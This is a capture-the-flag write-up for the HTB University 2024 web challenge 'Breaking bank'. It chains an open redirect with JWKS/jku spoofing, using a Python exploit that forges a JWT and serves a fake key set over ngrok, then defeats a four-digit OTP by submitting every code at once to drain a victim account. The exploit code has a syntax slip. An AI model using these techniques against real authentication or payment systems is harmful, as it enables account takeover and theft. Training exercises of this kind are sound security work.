---
title: HTB University 2024 Binary badlands
published: 2024-12-17
description: "Writeup for web category of HTB University 2024: Binary badlands"
image: "./cover.jpeg"
tags: ["2024"]
category: Web
draft: false
---

## Breaking bank
![Screenshot 2024-12-17 215158](https://github.com/user-attachments/assets/a5a9721a-4aa0-402a-9508-a9575ab9288b)

How to get flag: Steal all money in account ```financial-controller@frontier-board.htb```:
![Screenshot 2024-12-17 215407](https://github.com/user-attachments/assets/9990085f-8f7d-430b-bc2d-6a0052973489)
![Screenshot 2024-12-17 215641](https://github.com/user-attachments/assets/88e113c6-bd6c-4f18-945d-d5c7564edad4)

How to attack: Login in this account, then bypass otp to transper money.

Firstly, create a crendential with username: `fake@gmail.com` and password: `123`

![Screenshot 2024-12-17 220013](https://github.com/user-attachments/assets/6b6ac6f4-5f4e-4de7-bcbe-105bcb178895)

Time to steal money :v

In source code we have three hint:

- Hint 1:

![Screenshot 2024-12-17 220201](https://github.com/user-attachments/assets/2ca95f52-8b3d-4f20-b4d1-10789d0a15d9)
- Hint 2:

![Screenshot 2024-12-17 220228](https://github.com/user-attachments/assets/d173509e-9ee5-488e-b547-0bf09cccf382)
- Hint 3:

![Screenshot 2024-12-17 220252](https://github.com/user-attachments/assets/5e02e457-6262-4f5e-9458-6ada6f51d725)

### Hint 1:
![Screenshot 2024-12-17 220558](https://github.com/user-attachments/assets/cab68d4e-1728-40cb-97ea-d3511ab91c8b)

This is a redirect endpoint, what should i do with this...

### Hint 2:
![Screenshot 2024-12-17 221101](https://github.com/user-attachments/assets/eb1e7930-3d19-4bd0-b078-467e876c1974)

After asking many people,i have a conclusion that the vuln is JWKS Spoofing

Link: `https://0xdf.gitlab.io/2022/05/07/htb-unicode.html`

JWKS is JWT but use key to sign

In endpoint `/.well-known/jwks.json`, we have basic structure of jku.

![Screenshot 2024-12-17 222605](https://github.com/user-attachments/assets/0ab09ee7-eb90-4340-9987-25e21e842e30)

| Attribute    | Purpose                        |       
|--------------|--------------------------------|
|    `alg`     | Algorithm of jwt               |
| `   kty`     | Algorithm to create key        |
|    `use`     | Purpose of key, sig is signing |
|    `kid`     | Key identifier                 |
|    `n, e`     | Two component of RSA            |

:::important[Conclusion]
If jku change, the key of this will change.
:::

With that conclusion and this link above, i used chatgpt to create a python code to create key, make it become a web which is the same with `/.well-known/jwks.json`

:::note
Before run this code, change parameter `kid` in code with parameter `with` in endpoint `/.well-known/jwks.json`
:::

### Code exploit:

```python
import jwt
import json
import base64
from datetime import datetime
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from flask import Flask, jsonify

kid = "86147695-417b-46c7-85e7-1d71ef49562a"
redirect_url="https://8178-113-185-52-248.ngrok-free.app"
target_email="financial-controller@frontier-board.htb"

private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()


private_key_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)
public_key_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)


header = {
    "typ": "JWT",
    "kid": kid,
    "jku": f"http://127.0.0.1:1337/api/analytics/redirect?ref=cta-announcement&url={redirect_url}"
}

payload = {
    "email": target_email,
    "iat": int(datetime.now().timestamp())
}


jwt_token = jwt.encode(
    payload,
    private_key_pem,
    algorithm="RS256",
    headers=header
)


public_numbers = public_key.public_numbers()

def int_to_base64(num)
    return base64.urlsafe_b64encode(num.to_bytes((num.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()

key = {
    "kty": "RSA",
    "n": int_to_base64(public_numbers.n),
    "e": int_to_base64(public_numbers.e),
    "alg": "RS256",
    "use": "sig",
    "kid": kid
}
jwks = {"keys": [key]}

with open("private.pem", "w") as f:
    f.write(private_key_pem.decode())

with open("public.pem", "w") as f:
    f.write(public_key_pem.decode())

print("Generated JWT:")
print(jwt_token)

app = Flask(__name__)

@app.route('/', methods=['GET'])
def serve_jwks():
    return jsonify(jwks)

if __name__ == '__main__':
    print("Serving JWKS at http://127.0.0.1:5000/")
    app.run(host='0.0.0.0', port=5000)
```

Using ngrok with command `ngrok http 5000`

![Screenshot 2024-12-17 224527](https://github.com/user-attachments/assets/6e282cd1-68e9-411d-b8dd-596633efa68b)

After that, run the python code, and you will get a jwt:

![Screenshot 2024-12-17 224845](https://github.com/user-attachments/assets/5c5fe4d8-8717-48f5-83dc-5d66cc79655b)

In ngrok website: 

![Screenshot 2024-12-17 224949](https://github.com/user-attachments/assets/478cfe91-5d6a-4b22-ab63-70e7891ed545)

This is the fake key, now it time to check

![Screenshot 2024-12-17 225501](https://github.com/user-attachments/assets/b71f5cea-da54-41ec-834a-cf4ba7d01407)

It actually work!!!!

![Screenshot 2024-12-17 225628](https://github.com/user-attachments/assets/bdc737a1-64e3-4d11-9639-e9c997c5e078)

Refresh and

![Screenshot 2024-12-17 225735](https://github.com/user-attachments/assets/1b812d2f-e3dd-472a-a8f5-d828b609e7e8)

Bro why are you too rich 

Because this web only allow friends to transper money, we need to add fake nick as friend

![Screenshot 2024-12-17 225915](https://github.com/user-attachments/assets/d0f2bcfb-1418-4787-9969-16784598d85e)

Accept in fake nick

![Screenshot 2024-12-17 225957](https://github.com/user-attachments/assets/228e3e5e-daf7-4757-b925-fece74a81ae3)

Now we can transper money

![Screenshot 2024-12-17 230046](https://github.com/user-attachments/assets/1b0cc8d4-329c-4b08-9bec-6409a9a28d95)

Enter `available balance` value to drain his money 

![Screenshot 2024-12-17 230204](https://github.com/user-attachments/assets/49730133-c7b3-48f9-9f12-ff1518c11525)

Oh no OTP. I need to use burp suite

![Screenshot 2024-12-17 230319](https://github.com/user-attachments/assets/69e48e79-35f2-4748-bb62-2226451c4ec2)

How can bypass this now? It time to use hint number three

### Bypass otp

Chatgpt is too string :v.I used chatgpt to write a python code to create a file which contain a list from 0000 to 9999 

```python=
import json

numbers = [f'{i:04}' for i in range(10000)]

with open('numbers.txt', 'w') as f:
    json.dump(numbers, f)
```
Run this code, then enter the list to `otp` parameter:

![Screenshot 2024-12-17 230751](https://github.com/user-attachments/assets/85d07cd3-6831-4934-84b1-950de31e65b5)

Access api/dashboard and restart

![Screenshot 2024-12-17 230855](https://github.com/user-attachments/assets/839bd473-1d01-4e47-8da0-2c6ff8e376fe)


GG

### Flag: 
`
HTB{rugg3d_pu11ed_c0nqu3r3d_d14m0nd_h4nd5_b6128c123229cf8b3e0eb8c8b27a388c}
`
